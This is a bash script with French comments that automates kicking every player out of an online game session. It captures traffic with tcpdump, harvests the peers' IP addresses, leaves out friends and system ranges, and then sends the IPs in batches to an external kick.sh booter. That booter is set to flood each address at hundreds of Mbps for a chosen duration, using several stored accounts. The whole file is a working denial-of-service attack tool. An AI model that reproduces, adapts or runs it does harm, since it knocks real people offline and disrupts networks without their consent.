#!/bin/bash

#./kickallx.sh -c 20s -f capture.txt -d 180 -b 600 -g 5 -i eth0
#./kickallx.sh -c 20s -f capture.txt -d 60 -b 750 -g 4

# Ce script est utilisé pour expulser tous les joueurs présents dans la session.

usage="$(basename "$0") [-c duree] [-f fichier] [-d duree] [-b bandwidth] [-g groupsize] [-i interface]\nProgramme automatisant\n
    -c  définit la durée de la capture, une bonne valeur est 15 ou 20s. valeur par défaut : 15s\n
    -f  le fichier qui va contenir la capture. valeur par défaut : capture.txt\n
    -d  fixe la durée d'expulsion. valeur par défaut : 60s\n
    -b  fixe la puissance de l'expulsion en Mbps pour chaque IP. valeur par défaut : 500 Mbps\n
    -g  fixe le nombre d'adresses à expulser par compte. valeur par défaut : 6\n
    -i  fixe l'interface\n"

capture_duration=15s
file=capture.txt
duration=60
bandwidth=600
method=methode
port=3074
interval=0
occurences=1
groupsize=5
gsupplied=false
kickscript=kick.sh
interface=eth0

users=('user1' 'user2' 'user3')
passwords=('******' '******' '******')

# cette fonction attend que l'utilisateur appuie sur entrée avant de continuer
function pause(){
   read -p "$*"
}

# cette fonction teste si un tableau contient un élément
# elle prend 2 paramètres en entrée : l'élément à chercher puis le tableau
# elle retourne 0 si l'élément est présent dans le tableau, 1 sinon
function containsElement () {
  local e
  for e in "${@:2}"; do [[ "$e" == "$1" ]] && return 0; done
  return 1
}

function min() {
   if [ $1 -le $2 ]
   then
      echo $1
   else
      echo $2
   fi
}

# lecture des paramètres passés en entrée
while getopts c:f:d:b:g:i:h: opts; do
   case ${opts} in
      c) 
         capture_duration=${OPTARG} ;;
      f) 
         file=${OPTARG} ;;
      d) 
         duration=${OPTARG} ;;
      b) 
         bandwidth=${OPTARG} ;;
      g)
         gsupplied=true
         groupsize=${OPTARG} ;;
      i)
         interface=${OPTARG} ;;
      h) 
         echo -e $usage
         exit 0;;
      *) 
         echo -e $usage
         exit 0;;
   esac
done

# suppression des anciens fichiers
rm $file

# commande qui sert à faire saisir le mot de passe à l'utilisateur pour éviter qu'il ait à le saisir après
echo "sudo bidon pour saisir le mot de passe"
sudo ls > /dev/null

# capture des paquets et stockage des IP source et destination dans le fichier passé en paramètre. 
# ce fichier contiendra donc une IP par ligne
echo "debut de la capture des paquets"
sudo tcpdump -i $interface -n ip | awk '{ print gensub(/(.*)\..*/,"\\1","g",$3), $4, gensub(/(.*)\..*/,"\\1","g",$5) }' | awk -F " > " '{print $1"\n"$2}' > $file &

#for j in $(seq 1 ${#users[@]})
#do
#   ./$kickscript -S -u ${users[$j-1]} -s ${passwords[$j-1]} -v &
#done



# on attend pendant l'intervalle de temps passé en paramètre puis on kill le process tcpdump pour arrêter la capture
echo "attente "$capture_duration
sleep $capture_duration
echo "fin de la capture"
sudo killall tcpdump
sleep 2s
liste=()

# on parcourt le fichier contenant les IP extraites lors de la capture et on contruit le tableau "liste"
# de façon à ce qu'il contienne un seule occurence de chaque adresse IP
# on en profite également pour exclure certaines adresses système, ou celles des amis
while read line
do
   if [[ $line != 192.81.* ]] && [[ $line != 212.64.* ]] && [[ $line != 65.55.42.* ]] && [[ $line != 63.232.233.* ]] && [[ $line != 119.9.* ]] && [[ $line != 65.55.* ]] && ! grep -q -w $line whitelist.txt
   then
      containsElement $line ${liste[@]}
      if [[ $? == 1 ]]
      then
         echo "ajout de l'ip : "$line
         liste=("${liste[@]}" $line)
      fi
   fi
done < $file

for ip in "${liste[@]}"
do
   echo $ip >> liste_ip.txt
done

echo ${#liste[@]}" IP trouvees : "${liste[@]}

while true; do
    read -p "Voulez-vous continuer ? (O/N)" yn
    case $yn in
        [Oo]* ) break;;
        [Nn]* ) exit 0;;
        * ) echo "entrez O ou N";;
    esac
done

# calcul du nombre d'appels
callcount=$((${#liste[@]}/$groupsize))

# si la taille de la liste n'est pas un multiple de groupsize alors on rajoute 1 appel pour les IP restantes
if [[ $((${#liste[@]} % $groupsize)) != 0 ]]
then
   callcount=$(($callcount + 1))
fi

# dans le cas ou le nombre d'iterations est superieur au nombre de comptes disponibles,
# on le reduit en consequence
if (($callcount > ${#users[@]}))
then
   echo "il faudrait $callcount comptes et il n'y en a que ${#users[@]}"
   callcount=${#users[@]}
fi

# on effectue une itération pour chaque appel au script
for i in $(seq 1 $callcount)
do
   # on calcule le nombre d'IP à traiter. En effet, à la dernière occurence, on aura un nombre d'IP inférieur ou égal à groupsize
   # s'il est inférieur, il faudra extraire le nombre exact d'IP du tableau et également recalculer la puissance
   result=$(min $groupsize $((${#liste[@]}-$groupsize*($i-1))))
   # si le paramètre g est fourni (i.e le nombre d'IP par compte) alors on recalcule bandwidth de façon à avoir le maximum
   if $gsupplied
   then
      bandwidth=$((bandwidth=3000/$result))
   fi
   # on stocke le groupe d'IP dans un fichier
   echo ${liste[@]:$groupsize*(i-1):result} > liste_$i.txt
   # on appelle le script avec en paramètre le fichier contenant le groupe d'IP
   echo "appel $kickscript avec le compte "${users[$i-1]}
   ./$kickscript -m $method -d $duration -p $port -b $bandwidth -i $interval -o $occurences -h liste_$i.txt -u ${users[$i-1]} -s ${passwords[$i-1]} -v &
done

exit
